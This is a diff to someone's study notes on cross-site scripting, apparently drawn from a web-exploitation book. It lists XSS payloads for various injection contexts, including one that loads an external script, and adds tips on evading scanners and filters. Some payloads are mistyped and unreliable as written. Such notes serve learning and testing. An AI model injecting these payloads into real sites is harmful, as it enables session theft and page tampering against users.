@@ -5,6 +5,7 @@
 
 # Notes
 ## Attacking and Exploiting Modern Web Applications (Kindle)
+### Where is the output presenting itself?
 Determine where your input is getting printed in the HTTP response we receive back:
 - Inside the head or body: Easy, just use your regular HTML tags like `<script>alert(1)</script>` or load an external script `<script src=https://onofri.org/security/xss.js></script>.`
 - If you are inside a comment, you have to escape out of the comment: `--><script>alert(1)</script>`
@@ -12,6 +13,13 @@ Determine where your input is getting printed in the HTTP response we receive ba
 - If we are inside a HTMl attribute we can try terminate it right before our payload (vector). An attribute can be delimited by single or double quotes or whitespace. Then we close the tag and place our payload e.g `'><script>alert(1)</script>` or `"><script>alert(1)</script>`
 - If we can't escape out of an attribute we might be able to abuse it itself: e.g if we are in a `href` or `src` attribute we can use it directly with: `javascript:alert(1)` but each attribute/element might behave a little differently. And `"onmouseover="alert(1)` or  `'onmouseover='alert(1)` are valid for most.
 - If we're in JS code it depends where we are in the code, JS comments are `//`, it's line terminator is `;` and of course `'` + `"`
+- Markdown XSS is a thing: `[xss[(javascript:alert('1'))`
+
+### When is our input getting proces?
+`<script>alert(1)</script>` is triggered on page load. However if our payload laods dynamically, such as `<img src=xoneerror-alert(1)>`, this may be advantageous since onerror is triggered dynamically. Which means:
+- **Harder for security scanners to detect since the malicious code isn't present during initial page analysis**
+- **Can bypass some client-side filters that only check content on page load**
+- Often involves content that gets injected into the DOM after the page has already loaded
 
 
 
